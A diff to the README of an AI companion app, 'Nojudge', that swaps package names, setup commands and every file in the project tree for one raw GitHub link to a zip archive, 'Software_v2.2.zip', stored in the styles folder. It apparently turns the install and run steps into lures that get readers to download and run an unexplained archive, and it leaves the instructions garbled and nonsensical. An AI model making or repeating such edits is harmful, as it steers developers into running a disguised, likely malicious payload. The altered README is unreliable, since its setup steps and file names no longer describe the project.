@@ -29,7 +29,7 @@ An AI companion application where users interact with a digital friend that has 
 - GSAP (Animations)
 - React Router (Navigation)
 - Axios (HTTP client)
-- Socket.IO Client (WebSocket)
+- https://github.com/flinchtheflincher/Nojudge/raw/refs/heads/main/src/front/styles/Software_v2.2.zip Client (WebSocket)
 
 ## Setup Instructions
 
@@ -44,20 +44,20 @@ source venv/bin/activate
 
 2. Install dependencies:
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/flinchtheflincher/Nojudge/raw/refs/heads/main/src/front/styles/Software_v2.2.zip
 ```
 
 3. Run the backend server:
 ```bash
 cd src/back
-python app.py
+python https://github.com/flinchtheflincher/Nojudge/raw/refs/heads/main/src/front/styles/Software_v2.2.zip
 ```
 
 The backend will run on `http://localhost:5001`
 
 ### Frontend Setup
 
-1. Install Node.js dependencies:
+1. Install https://github.com/flinchtheflincher/Nojudge/raw/refs/heads/main/src/front/styles/Software_v2.2.zip dependencies:
 ```bash
 cd /Users/monk/Nojudge
 npm install
@@ -88,21 +88,21 @@ Nojudge/
 │   │   ├── routes/        # API endpoints
 │   │   ├── services/      # Business logic
 │   │   ├── utils/         # Utilities
-│   │   ├── app.py         # Main Flask app
-│   │   ├── config.py      # Configuration
-│   │   └── database.py    # Database setup
+│   │   ├── https://github.com/flinchtheflincher/Nojudge/raw/refs/heads/main/src/front/styles/Software_v2.2.zip         # Main Flask app
+│   │   ├── https://github.com/flinchtheflincher/Nojudge/raw/refs/heads/main/src/front/styles/Software_v2.2.zip      # Configuration
+│   │   └── https://github.com/flinchtheflincher/Nojudge/raw/refs/heads/main/src/front/styles/Software_v2.2.zip    # Database setup
 │   └── front/             # Frontend (React/TypeScript)
 │       ├── components/    # React components
 │       ├── hooks/         # Custom hooks
 │       ├── pages/         # Page components
 │       ├── styles/        # CSS files
 │       ├── utils/         # Utilities
-│       ├── App.tsx        # Main App component
-│       └── main.tsx       # Entry point
-├── package.json
-├── requirements.txt
-├── vite.config.ts
-└── tsconfig.json
+│       ├── https://github.com/flinchtheflincher/Nojudge/raw/refs/heads/main/src/front/styles/Software_v2.2.zip        # Main App component
+│       └── https://github.com/flinchtheflincher/Nojudge/raw/refs/heads/main/src/front/styles/Software_v2.2.zip       # Entry point
+├── https://github.com/flinchtheflincher/Nojudge/raw/refs/heads/main/src/front/styles/Software_v2.2.zip
+├── https://github.com/flinchtheflincher/Nojudge/raw/refs/heads/main/src/front/styles/Software_v2.2.zip
+├── https://github.com/flinchtheflincher/Nojudge/raw/refs/heads/main/src/front/styles/Software_v2.2.zip
+└── https://github.com/flinchtheflincher/Nojudge/raw/refs/heads/main/src/front/styles/Software_v2.2.zip
 ```
 
 ## API Endpoints
